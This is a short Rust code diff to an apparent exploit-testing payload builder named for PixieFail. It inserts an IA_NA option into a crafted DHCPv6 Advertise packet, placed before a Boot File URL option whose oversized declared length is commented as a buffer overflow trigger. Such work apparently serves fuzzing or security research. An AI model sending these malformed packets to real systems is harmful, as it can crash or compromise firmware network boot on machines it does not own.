@@ -65,8 +65,20 @@ impl Payload for PixiefailDhcpPayload {
         data[pref_offset + 3] = 1; // length
         data[pref_offset + 4] = 0xFF; // preference value
 
+        // Option: IA_NA (option 3) — identity association, present in
+        // every Advertise; keeps the set of recognized option codes
+        // realistically varied.
+        let iana_offset = pref_offset + 4 + 1;
+        data[iana_offset] = 0x00;
+        data[iana_offset + 1] = 3; // OPTION_IA_NA
+        data[iana_offset + 2] = 0x00;
+        data[iana_offset + 3] = 40; // length: IAID + T1 + T2 + one address
+        for i in 0..40 {
+            data[iana_offset + 4 + i] = 0x20;
+        }
+
         // Option: Boot File URL (option 59) with oversized length
-        let opt3_offset = pref_offset + 4 + 1;
+        let opt3_offset = iana_offset + 4 + 40;
         data[opt3_offset] = 0x00;
         data[opt3_offset + 1] = 59; // OPTION_BOOTFILE_URL
                                     // Declare length that exceeds packet (buffer overflow trigger)
